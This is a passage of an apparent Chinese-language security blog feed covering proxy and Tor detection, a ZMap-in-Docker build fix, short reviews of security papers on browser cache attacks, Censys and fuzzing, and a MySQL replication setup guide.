ip = <span class="string">"199.254.238.52"</span>, port = <span class="string">"80"</span> &#125;</span><br></pre></td></tr></table></figure></p>
<p>　　流量在Tor之间传输都是加密的形式，而出口节点的信息，则是透明的，除非使用https协议或者其他安全方式。因此，如果在tor网络只使用http协议访问网站，那么你的信息，就可以被别人捕获到。</p>
<h2 id="u4EE3_u7406_u7684_u68C0_u6D4B_u65B9_u6CD5"><a href="#u4EE3_u7406_u7684_u68C0_u6D4B_u65B9_u6CD5" class="headerlink" title="代理的检测方法"></a>代理的检测方法</h2><h3 id="https/http_u4EE3_u7406_u68C0_u6D4B"><a href="#https/http_u4EE3_u7406_u68C0_u6D4B" class="headerlink" title="https/http代理检测"></a>https/http代理检测</h3><p>　　最常见的方式是转发，其次对于报文头的一些头信息，可以间接的判断。最常见的比如<code>http_via,remote_ip,x_forworded_for</code>这些字段，其次一些代理产品，有相应的产品指纹，可以直接获得。对于目标ip,如果其真实操作系统和请求头信息不匹配，也可以认为是代理。依此类推时间，语言，操作系统任何一个不一致，都可以被认为是代理。对于VPN产品信息，有特定的指纹信息，可以通过请求返回的报文判断。</p>
<h3 id="socks_u4EE3_u7406_u68C0_u6D4B"><a href="#socks_u4EE3_u7406_u68C0_u6D4B" class="headerlink" title="socks代理检测"></a>socks代理检测</h3><p>　　通过转发的方式，判断是否是代理</p>
<h3 id="Tor_u68C0_u6D4B"><a href="#Tor_u68C0_u6D4B" class="headerlink" title="Tor检测"></a>Tor检测</h3><p>　　tor的检测，可以直接从共识文档获取，因为tor的出口节点ip才是我们想要的，所以直接检测tor出口节点就行了。<br>  　此外，tor-browser启动的时候，会在本地开放一个tor-socks端口，通过这个端口也可以间接的判断是否是代理IP.</p>
<h3 id="u901A_u7528_u68C0_u6D4B_u65B9_u6CD5"><a href="#u901A_u7528_u68C0_u6D4B_u65B9_u6CD5" class="headerlink" title="通用检测方法"></a>通用检测方法</h3><p>　　通用的方法，就是以IP为单位，比如IP的whois信息，以及DNSBL信息等，都可以推测出。<br>  　此外，网上免费代理的名单也可以间接的作为一份黑名单。</p>
<h2 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h2><p>　　然而，对于代理检测，目前最前沿的方式是，通过在客户端添加一个自有协议，通过这个协议来检测访问时延。通过对这个时延的判断，来间接的判断，是否代理。而这个访问的依据是，使用代理会比不使用代理的速度会慢一点，因为一个请求默认会匹配最近的基站，如果使用代理，相当于绕远路的方式，因此可以通过这个方式来检测。<br>      而对于，提高代理检测的速度，以及其他优化的方法，会在下一篇文章中细数。</p>
]]></content>
      
        <categories>
            
            <category> 安全研发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Proxy </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Run Zmap in docker]]></title>
      <url>https://nanshihui.github.io/2017/01/05/run-zmap-in-docker/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>最近尝试在Docker环境中安装ZMAP，出现一些问题<p></p>
<h3 id="u603B_u4F53"><a href="#u603B_u4F53" class="headerlink" title="总体"></a>总体</h3><ul>
<li><strong>情况描述1:</strong>　出现 SIOCGIFADDR: Invalid argument</li>
<li><strong>情况描述2:</strong>　无法发包<a id="more"></a>
<h2 id="u95EE_u9898_u63CF_u8FF0"><a href="#u95EE_u9898_u63CF_u8FF0" class="headerlink" title="问题描述"></a>问题描述</h2></li>
</ul>
<p>　　最近因为需要，遂在Docker环境的下Centos，安装ZMAP。安装的时候出现一系列组件没有完全。网上的在Centos里安装ZMAP的方法，已经无法使用。也不能使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　　yum install zmap</span><br></pre></td></tr></table></figure></p>
<p>类似这样的方法，因此就只能自己乖乖的安装基本组件。</p>
<h2 id="u5B89_u88C5_u6D41_u7A0B"><a href="#u5B89_u88C5_u6D41_u7A0B" class="headerlink" title="安装流程"></a>安装流程</h2><p>　　相关的安装方法可以参考<a href="https://github.com/zmap/zmap" target="_blank" rel="external">ZMAP</a>官方的教程。在安装<a href="https://github.com/zmap/zmap" target="_blank" rel="external">ZMAP</a>之前还需要安装<a href="https://github.com/json-c/json-c" target="_blank" rel="external">JSON-C</a>.相关的参考文档，在对应的git都有相应的教程。</p>
<h3 id="u9700_u8981_u7684_u73AF_u5883"><a href="#u9700_u8981_u7684_u73AF_u5883" class="headerlink" title="需要的环境"></a>需要的环境</h3><ul>
<li>gcc</li>
<li>libtool&gt;=2.2.6b</li>
<li>autoconf&gt;=2.64 (autoreconf)</li>
<li>automake&gt;=1.10.3</li>
</ul>
<p>　　在遇到这些库没有的时候，在Google直接搜索对应的组件以及版本，找到对应的RPM包进行安装。<br>　　在安装完JSON-C后，安装ZMAP会出现缺少JSON-C组件，这时候就需要自己添加路径。或者安装一个libjson的库。</p>
<h2 id="u8FD0_u884C_u95EE_u9898"><a href="#u8FD0_u884C_u95EE_u9898" class="headerlink" title="运行问题"></a>运行问题</h2><p>　　在运行ZMAP的时候，会出现如下错误:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap:could not detect default network interface(e,g.eth0).Try running as root or setting interface using -i flag</span><br></pre></td></tr></table></figure>
<p>　　这时候通过ifconfig查找对应interface name，然后在运行ZMAP运行的时候添加-i 参数，并附上interface name就行了。<br>　　虽然能运行起来，但是会发现程序无法收发包，通过 tcpdump 抓包发现程序也无法发包，显示错误：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SIOCGIFADDR: Invalid argument</span><br></pre></td></tr></table></figure></p>
<p>通过gdb单步调试，确定报错的位置在send-linux.h文件的如下函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ioctl(sock, SIOCGIFADDR, &amp;<span class="keyword">if</span>_ip) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"SIOCGIFADDR"</span>);</span><br><span class="line">		<span class="built_in">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后观察前后文，并没有发现<code>if_ip</code>被使用的情况<br>因此就注释了这一段，然后重新把源码编译一下，就能够运行了。</p>
<p>然后将问题反馈给ZMAP作者，并修复了这个问题。详细细节见<a href="https://github.com/zmap/zmap/issues/279#issuecomment-270719911" target="_blank" rel="external">https://github.com/zmap/zmap/issues/279#issuecomment-270719911</a></p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Centos </tag>
            
            <tag> Docker </tag>
            
            <tag> Zmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[The Spy in the Sandbox :Practical Cache Attacks in JavaScript and their Implications]]></title>
      <url>https://nanshihui.github.io/2016/05/27/the-spy-in-the-sandbox/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>仅记录The Spy in the Sandbox: Practical Cache Attacks in JavaScript and their Implications 读后短评<p></p>
<h3 id="u7ED3_u6784"><a href="#u7ED3_u6784" class="headerlink" title="结构"></a>结构</h3><ul>
<li><strong>概要</strong> 论文概要；</li>
<li><strong>介绍:</strong> 论文主要内容；</li>
<li><strong>结论:</strong> 论文结论；</li>
</ul>
<a id="more"></a>
<h2 id="u80CC_u666F_u8D44_u6599"><a href="#u80CC_u666F_u8D44_u6599" class="headerlink" title="背景资料"></a>背景资料</h2><ul>
<li>单位及作者 ：Yossef Oren Vasileios P. Kemerlis Simha Sethumadhavan Angelos D. Keromytis, Columbia University</li>
<li>年份 ：2015</li>
<li>类型：CCS</li>
</ul>
<h2 id="u6982_u8981"><a href="#u6982_u8981" class="headerlink" title="概要"></a>概要</h2><p>　　在浏览器上提出一个微架构的侧信道攻击。相较于之前的侧信道攻击，攻击者不需要在受害者电脑上安装任何软件。攻击者只需要在恶意网站上嵌入恶意代码就行。这使我们的攻击模型高度可扩展，在今天的网络非常有针对性和实用性。因为目前大多数用于访问因特网的桌面浏览器都受到这种侧信道威胁。该攻击是最后一级缓存的扩展，允许远程攻击者以恢复属于其他进程的信息、用户、甚至是与受害人的Web浏览器运行在同一台物理主机上的虚拟机。<br>　　此外本文描述了该攻击的基本原理，并评估其性能特点。并展示在一个共同的环境中它如何被用来危及用户隐私，让攻击者窥视受害者的浏览隐私。抵御这侧信道攻击是可能的，但所需要的对策在友好使用浏览器上要付出不切实际的成本。（but the required countermeasures can exact an impractical cost on benign uses of the browser.）</p>
<h2 id="u539F_u6587_u6458_u8981"><a href="#u539F_u6587_u6458_u8981" class="headerlink" title="原文摘要"></a>原文摘要</h2><p>　　We present a micro-architectural side-channel attack that runs entirely in the browser. In contrast to previous work in this genre, our attack does not require the attacker to install software on the victim’s machine; to facilitate the attack,the victim needs only to browse to an untrusted webpage that contains attacker-controlled content. This makes our attack model highly scalable, and extremely relevant and practical to today’sWeb, as most desktop browsers currently used to access the Internet are a_ected by such side channel threats. Our attack, which is an extension to the last-level cache attacks of Liu et al. , allows a remote adversary to recover information belonging to other processes, users, and even virtual machines running on the same physical host with the victim web browser.<br>　　We describe the fundamentals behind our attack, and evaluate its performance characteristics. In addition, we show how it can be used to compromise user privacy in a common setting, letting an attacker spy after a victim that uses private browsing. Defending against this side channel is possible, but the required countermeasures can exact an impractical cost on benign uses of the browser..</p>
<h2 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h2><p>　　文章中的模型是建立在受害者需要访问攻击者的网站。作者展示攻击者在现实环境中如何攻击和提取受害者机器上有意义的信息。并在此环境下将重点从加密密钥的恢复转向到对用户行为的跟踪。攻击的前提是受害者使用搭载新特尔处理器的计算器，并且受害者使用支持html5的浏览器访问网页。基于JavaScript的缓存攻击，让攻击者访问跟踪到受害者的最后一级缓存。由于这个单一缓存被所有CPU核心共享，这种访问信息可以提供攻击者有关用户和系统的详细知识。<br>　　作者的工作：（1）提出创建最后一级缓存的非规范驱逐集的方法。该不需要大页面系统的支持，可以立即被应用到更广泛的各种系统。（2）证明只用JavaScript代码对最后一级缓存攻击。在同一台机器上和虚拟机客户端和主机之间运行不同的程序，使用隐蔽信道的方法评估它的性能，媲美原生代码的方法。（3）展示基于高速缓存的攻击是如何跟踪用户的行为。具体来说，提出了一个简单的基于分类的攻击，让网页恶意窥视用户的浏览活动，检测用户使用常见网站的准确度超过80％。它甚至可以窥视一个完全不同浏览器的隐私浏览会话。</p>
<h2 id="u7ED3_u8BBA"><a href="#u7ED3_u8BBA" class="headerlink" title="结论"></a>结论</h2><p>　　演示了一个微架构如何进行侧信道缓存攻击，这已经是公认的非常有效的攻击方法，可以通过不受信任的网页启动。用缓存的攻击取代传统密码分析，展示了使用该方法如何成功跟踪用户行为。侧信道攻击的潜在范围已扩大，这意味着系统的其他类的设计必须考虑到旁道对策</p>
<h2 id="u6CE8_u89E3"><a href="#u6CE8_u89E3" class="headerlink" title="注解"></a>注解</h2><p>　　最后一级缓存攻击，攻击的角度新颖，而且发动的成本低，巧妙的绕过了js语言不能直接访问内存信息的特性。根据CPU架构的特点，有针对的攻击。随着html5的支持度广泛，会有更多可能可利用的API可以利用。</p>
]]></content>
      
        <categories>
            
            <category> 论文阅读 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CCS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[A Search Engine Backed by Internet-Wide Scanning]]></title>
      <url>https://nanshihui.github.io/2016/05/17/A-Search-Engine-Backed-by-Internet-Wide-Scanning/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>仅记录A Search Engine Backed by Internet-Wide Scanning读后短评<p></p>
<h3 id="u7ED3_u6784"><a href="#u7ED3_u6784" class="headerlink" title="结构"></a>结构</h3><ul>
<li><strong>概要</strong> 论文概要；</li>
<li><strong>介绍:</strong> 论文主要内容；</li>
<li><strong>结论:</strong> 论文结论；</li>
</ul>
<a id="more"></a>
<h2 id="u80CC_u666F_u8D44_u6599"><a href="#u80CC_u666F_u8D44_u6599" class="headerlink" title="背景资料"></a>背景资料</h2><ul>
<li>单位及作者 ：Zakir Durumeric、 David Adrian† Ariana Mirian、 Michael Bailey、 J. Alex Halderman，University of Michigan ,University of Illinois, Urbana Champaign</li>
<li>年份 ：2015</li>
<li>类型：CCS</li>
</ul>
<h2 id="u6982_u8981"><a href="#u6982_u8981" class="headerlink" title="概要"></a>概要</h2><p>　　快速的网络扫描给安全研究创建了一个新的途径，从揭露随机数发生器的脆弱性到心脏出血的影响。然而，这种技术仍然需要很大的改进：比如，“哪款嵌入式设备更倾向于CBC加密？”，即使是简单的问题，需要开发一个应用扫描器，手动识别和标记设备，与网络管理员协商，并需要应对一些投诉。在本文中，我们将介绍Censys，他是公共搜索引擎和数据处理设备，其数据来源于持续的Internet范围扫描。旨在帮助研究人员回答与安全有关的问题，Censys在协议banner上支持全文搜索和查询范围很广的字段（例如443.https.cipher）。它可以识别特定的易受攻击的设备和网络，并对广泛的使用模式和趋势生成统计报告。 Censys能在毫秒级的时间返回这些结果，大幅降低了解互联网主机所付出的代价。我们提出了一个搜索引擎的架构并实验对其性能进行评估。我们还探索Censys，如何简单回答最近的研究中提出的问题。</p>
<h2 id="u539F_u6587_u6458_u8981"><a href="#u539F_u6587_u6458_u8981" class="headerlink" title="原文摘要"></a>原文摘要</h2><p>　　Fast Internet-wide scanning has opened new avenues for security research, ranging from uncovering widespread vulnerabilities in random number generators to tracking the evolving impact of Heartbleed. However, this technique still requires significant effort: even simple questions, such as, “What models of embedded devices prefer CBC ciphers?”, require developing an application scanner, manually identifying and tagging devices, negotiating with network administrators, and responding to abuse complaints. In this paper, we introduce Censys, a public search engine and data processing facility backed by data collected from ongoing Internet-wide scans. Designed to help researchers answer security-related questions, Censys supports full-text searches on protocol banners and querying a wide range of derived fields (e.g., 443.https.cipher). It can identify specific vulnerable devices and networks and generate statistical reports on broad usage patterns and trends. Censys returns these results in sub-second time, dramatically reducing the effort of understanding the hosts that comprise the Internet. We present the search engine architecture and experimentally evaluate its performance. We also explore Censys’s applications and show how questions asked in recent studies become simple to answer.</p>
<h2 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h2><p>　　使用ZMAP可以快速的扫描网络，但是在Internet范围收集有意义的数据仍然是一个专业化和劳动密集的过程。比如回答“哪一部分的https服务器更倾向于使用forward secret key exchange methods”这样的问题，这可能要花费一周的时间。在这种情况下专业人员需要开发高性能的应用扫描器对其他主机的443端口建立https连接并进行监听，测试并修复那些不完全遵循TLS规范的主机，然后又要扫描处理大量的返回数据。在开始此过程之前，安全研究人员必须与他们的权限机构和网络团队谈判进行扫描，还要和他们的上游网络供应商进行协调，以及后来滥用的回应。许多机构（和独立的研究人员）缺乏网络设施或行政支持，执行扫描。由于这些原因，Internet范围扫描仍然是一个小数目的研究群体，这严重地限制了应用这个方法的应用程序。Internet范围的扫描已经在发现安全问题和理解复杂的分布式系统的安全性表现出了极大的潜力。通过移动扫描到云，Censys显着减少调查这些问题所需的工作量，使研究人员能够专注于问更重要的问题，而不是回答他们的机制。此外，Censys允许安全社区增加全球协议的覆盖度，并为理解互联网增加的越来越多的嵌入式设备提供了易于处理的解决方案。同时，它最大限度地减少研究小组多余的扫描以及网络运营商监控所传入的网络流量。<br>　　作者的工作：（1）提出了一个数据收集架构（2）针对近期的安全研究，给出了POODLE以及追踪工业控<br>制系统漏洞的影响。（3）实现这个架构。</p>
<h2 id="u7ED3_u8BBA"><a href="#u7ED3_u8BBA" class="headerlink" title="结论"></a>结论</h2><p>　　在回答有意义的安全研究问题上，对IPv4地址空间，进行主机发现扫描的技术能力仍有差距。在本文中，介绍了Censys，通过持续的Internet范围扫描收集数据来支撑的公共查询引擎和数据处理设备。旨在帮助研究人员回答安全有关的问题，Censys收集IPv4地址空间的数据，支持从扫描结果导出的字段进行查询并生成统计报表。探讨Censys的几个安全应用，展现Censys如何能用来方便地回答最近研究的问题。希望Censys使研究人员能够轻松地回答关于以前需要大量精力在网络上的问题，同时减少了重复劳动和总流量扫描。</p>
<h2 id="u6CE8_u89E3"><a href="#u6CE8_u89E3" class="headerlink" title="注解"></a>注解</h2><p>　　该文侧重于从工程的角度描述了如何搭建一个全局的扫描框架体系，并以其中一个漏洞，针对该漏洞的影响力，生成一个可视化的报告。国内的ZOOMEYE以及俄罗斯的sodan都有些相似。随着以后安全的发展，基于大数据的安全操作会将变得越来越突出。</p>
]]></content>
      
        <categories>
            
            <category> 论文阅读 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CCS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Program-Adaptive Mutational Fuzzing]]></title>
      <url>https://nanshihui.github.io/2016/05/10/Program-Adaptive-Mutational-Fuzzing/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>仅记录Program-Adaptive Mutational Fuzzing读后短评<p></p>
<h3 id="u7ED3_u6784"><a href="#u7ED3_u6784" class="headerlink" title="结构"></a>结构</h3><ul>
<li><strong>概要</strong> 论文概要；</li>
<li><strong>介绍:</strong> 论文主要内容；</li>
<li><strong>结论:</strong> 论文结论；</li>
</ul>
<a id="more"></a>
<h2 id="u80CC_u666F_u8D44_u6599"><a href="#u80CC_u666F_u8D44_u6599" class="headerlink" title="背景资料"></a>背景资料</h2><ul>
<li>单位及作者 ：Sang Kil Cha, Maverick Woo, and David Brumley，Carnegie Mellon University</li>
<li>年份 ：2015</li>
<li>类型：S&amp;P</li>
</ul>
<h2 id="u6982_u8981"><a href="#u6982_u8981" class="headerlink" title="概要"></a>概要</h2><p>　　针对黑盒模糊测试所提供的程序和一个种子输入，设计出一个算法尽可能的找出更多的bug，主要是通过给定一个程序和一个种子对，通过白盒元素分析来追踪以检测输入串比特位置之间的依赖。使用这个依赖关系，针对给定的程序和种子对，计算出一个最佳的突变率。最终使用之前3款模糊测试工具，在8款应用使用相同的模糊测试时间测试，比其他模糊测试软件发现的bug数量，平均多发现37.2%。</p>
<h2 id="u539F_u6587_u6458_u8981"><a href="#u539F_u6587_u6458_u8981" class="headerlink" title="原文摘要"></a>原文摘要</h2><p>　　We present the design of an algorithm to maximize the number of bugs found for black-box mutational fuzzing given a program and a seed input. The major intuition is to leverage white-box symbolic analysis on an execution trace for a given program-seed pair to detect dependencies among the bit positions of an input, and then use this dependency relation to compute a probabilistically optimal mutation ratio for this program-seed pair. Our result is promising: we found an average of 37.2% more bugs than three previous fuzzers over 8 applications using the same amount of fuzzing time.</p>
<h2 id="u4ECB_u7ECD"><a href="#u4ECB_u7ECD" class="headerlink" title="介绍"></a>介绍</h2><p>　　在文章中介绍了一个名为SYMFUZZ的系统，该系统可以在给定程序和输入种子的情况下，计算出最佳突变率来发现可能的软件崩溃情况。其通过白盒技术分析程序执行情况得出一个有效的突变模糊比率，来增强效果，相较于传统的黑盒突变模糊测试衍生出一个突变率。尽管白盒分析会花去很多时间，但是每个程序种子对，只需要一次预处理步骤。<br>　　文章认为最佳突变率可以从输入比特之间的依赖关系进行推导。举个例子，当给出一个程序和一个由32位幻数和两个连续的32位整数所组成的96位的种子，假设这个幻数是42424242（16进制），两个整数都为0.且当输入值为42424242，以及第三个字段为负整数的时候，程序崩溃。因此我们需要翻转第三字段最有效的比特位，不去翻转第一字段的比特位。第二段的比特值并不会影响程序，而第一字段和第三字段存在一种依赖关系。<br>　　软件运行分两步：先翻转输入的种子比特位产生测试用例。再评估使用测试用例是否会使程序崩溃。假设预先知道输入种子的类型以及程序是怎么运行。那么模糊软件选择变动的比特位取决于程序，输入种子，突变率有关。<br>　　作者的工作：（1）设计出一个数学架构标准化突变模糊测试，对模糊测试比特位之间的关联性进行建模。（2）提出最佳突变率，来尽可能发现更多的bug。（3）结合黑白盒来提高模糊测试的效率。（4）设计出一个突变模糊测试框架。</p>
<h2 id="u7ED3_u8BBA"><a href="#u7ED3_u8BBA" class="headerlink" title="结论"></a>结论</h2><p>　　设计出一个算法，在给定程序以及输入种子会产生一个最佳突变率。结合黑白盒来查找程序的bug。同时将输入位之间的关联所引起的程序崩溃率进行标准化。并且将突变率最优化进行建模，通过执行追踪评估出最佳突变率。通过本程序的数据集，可以找到的bug数量比BFF（一款模糊测试工具）多39.5%，比zzuf多57.9%.。另外经过同样24小时的测试，使用本算法的AFL-FUZZ找到bug的数量比原始多了18.5%。</p>
<h2 id="u6CE8_u89E3"><a href="#u6CE8_u89E3" class="headerlink" title="注解"></a>注解</h2><p>　　该文侧重于只针对单个输入，对一定长度序列选择最佳的测试用例，针对于协议的漏洞可以收到比较良好的效果。另外比较受欢迎的方式就是白盒测试，做代码审计形成一个语法树，找出存在危险的语句。而对于WEB应用的漏洞，采用这样的方法，就不一定会适合，首先输入的位置较多，其次输入的测试用例不同于本实验的字符串，无法穷举。</p>
]]></content>
      
        <categories>
            
            <category> 论文阅读 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> S&amp;P </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL主从库相关信息整理]]></title>
      <url>https://nanshihui.github.io/2016/04/18/MySQL%E4%B8%BB%E4%BB%8E%E5%BA%93%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>仅记录在主从库遇到的坑<p></p>
<h3 id="u76F8_u5173_u7684_u914D_u7F6E_u65B9_u5F0F"><a href="#u76F8_u5173_u7684_u914D_u7F6E_u65B9_u5F0F" class="headerlink" title="相关的配置方式"></a>相关的配置方式</h3><ul>
<li><strong>服务创建:</strong> 基本配置；</li>
<li><strong>注意事项:</strong> 一些细节注意的地方；</li>
<li><strong>主从原理:</strong> 基本的原理解析；</li>
</ul>
<a id="more"></a>
<h2 id="u670D_u52A1_u521B_u5EFA"><a href="#u670D_u52A1_u521B_u5EFA" class="headerlink" title="服务创建"></a>服务创建</h2><p>  需要主库以及从库</p>
<h3 id="u76F8_u5173_u6B65_u9AA4"><a href="#u76F8_u5173_u6B65_u9AA4" class="headerlink" title="相关步骤"></a>相关步骤</h3><ul>
<li>创建用户</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT REPLICATION SLAVE ON *.* TO <span class="string">'slave'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'123456'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改MySQL配置文件</li>
</ul>
<p>a)master</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/my.cnf   </span></span><br><span class="line">    =============   </span><br><span class="line">    [mysqld]   </span><br><span class="line">    server-id = <span class="number">1</span>   </span><br><span class="line">    <span class="built_in">log</span>_bin = mysql-bin   </span><br><span class="line">    binlog-do-db = <span class="built_in">test</span> <span class="comment"># 多个写多行   </span></span><br><span class="line">    binlog-ignore-db = mysql <span class="comment">#多个写多行   </span></span><br><span class="line">    max_binlog_size = <span class="number">500</span>M</span><br><span class="line">    binlog_cache_size = <span class="number">128</span>K</span><br><span class="line">    <span class="built_in">log</span>-slave-updates</span><br><span class="line">    expire_logs_day=<span class="number">2</span></span><br><span class="line">    binlog_format=<span class="string">"MIXED"</span></span><br><span class="line">    =============</span><br></pre></td></tr></table></figure>
<p>b)slave，配置每个slave</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/my.cnf   </span></span><br><span class="line">[mysqld]   </span><br><span class="line">server-id = <span class="number">2</span>   </span><br><span class="line"><span class="built_in">log</span>_bin = mysql-bin   </span><br><span class="line">replicate-do-db = <span class="built_in">test</span>   </span><br><span class="line">replicate-ignore-db = mysql   </span><br><span class="line">replicate-ignore-db = information_schema   </span><br><span class="line">slave-skip-errors=<span class="number">1007</span>,<span class="number">1008</span>,<span class="number">1053</span>,<span class="number">1062</span>,<span class="number">1213</span>,<span class="number">1158</span>,<span class="number">1159</span></span><br><span class="line">master-info-file = /home/mysql/logs/master.info</span><br><span class="line">relay-log = /home/mysql/logs/relay-bin</span><br><span class="line">relay-log-index = /home/mysql/logs/relay-bin.index</span><br><span class="line">relay-log-info-file = /home/mysql/logs/relay-log.info</span><br><span class="line">=============</span><br></pre></td></tr></table></figure>
<ul>
<li>启动slave后执行(各台slave操作类似)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CHANGE MASTER TO MASTER_HOST = ’<span class="number">127.0</span>.<span class="number">0.1</span><span class="string">', MASTER_USER = '</span>slave<span class="string">', MASTER_PASSWORD = '</span><span class="number">123456</span><span class="string">', MASTER_LOG_FILE = '</span>mysql-bin.<span class="number">000001</span><span class="string">', MASTER_LOG_POS = 107; </span><br><span class="line">//（通过在master上SHOW MASTER STATUS 来得到MASTER_LOG_FILE和MASTER_LOG_POS的值）   </span><br><span class="line">SLAVE START;   </span><br><span class="line">SHOW SLAVE STATUS ; //查看是否同步上</span></span><br></pre></td></tr></table></figure>
<ul>
<li>登录master，增删改数据后看下各slave是否正常同步到</li>
</ul>
<h2 id="u6CE8_u610F_u4E8B_u9879"><a href="#u6CE8_u610F_u4E8B_u9879" class="headerlink" title="注意事项"></a>注意事项</h2><p>　　在同步时候，有时候会发现经常1062的错误，可以在配置的时候，添加配置项skip-error项。如果修改了连接主库相关信息，重启之前一定要删除master.info文件，否则重启之后由于连接信息改变从库而不会自动连接主库，造成同步失败。此文件是保存连接主库信息的。</p>
<h2 id="u4E3B_u4ECE_u539F_u7406"><a href="#u4E3B_u4ECE_u539F_u7406" class="headerlink" title="主从原理"></a>主从原理</h2><h3 id="Replication__u7EBF_u7A0B"><a href="#Replication__u7EBF_u7A0B" class="headerlink" title="Replication 线程"></a>Replication 线程</h3><p>　　Mysql的 Replication 是一个异步的复制过程（mysql5.1.7以上版本分为异步复制和半同步两种模式），从一个 Mysql instace(我们称之为 Master)复制到另一个Mysql instance(我们称之 Slave)。在 Master 与 Slave 之间的实现整个复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在 Slave端，另外一个线程(IO线程)在 Master 端。要实现 MySQL 的 Replication ，首先必须打开 Master 端的Binary Log(mysql-bin.xxxxxx功能，否则无法实现。因为整个复制过程实际上就是Slave从Master端获取该日志然后再在自己身上完全 顺序的执行日志中所记录的各种操作。打开 MySQL 的 Binary Log 可以通过在启动 MySQL Server 的过程中使用 “—log-bin” 参数选项，或者在 my.cnf 配置文件中的 mysqld 参数组([mysqld]标识后的参数部分)增加 “log-bin” 参数项。</p>
<h3 id="MySQL__u590D_u5236_u7684_u57FA_u672C_u8FC7_u7A0B_u5982_u4E0B"><a href="#MySQL__u590D_u5236_u7684_u57FA_u672C_u8FC7_u7A0B_u5982_u4E0B" class="headerlink" title="MySQL 复制的基本过程如下"></a>MySQL 复制的基本过程如下</h3><p>　　1. Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容；<br>　　2. Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置；<br>　　3. Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”<br>　　4. Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的</p>
<h2 id="u9644_u5F55"><a href="#u9644_u5F55" class="headerlink" title="附录"></a>附录</h2><h3 id="MySQL__u7684_u4E3B_u4ECE_u914D_u7F6E_u6587_u4EF6"><a href="#MySQL__u7684_u4E3B_u4ECE_u914D_u7F6E_u6587_u4EF6" class="headerlink" title="MySQL 的主从配置文件"></a>MySQL 的主从配置文件</h3><p>相关内容仅供参考:<br>主库配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 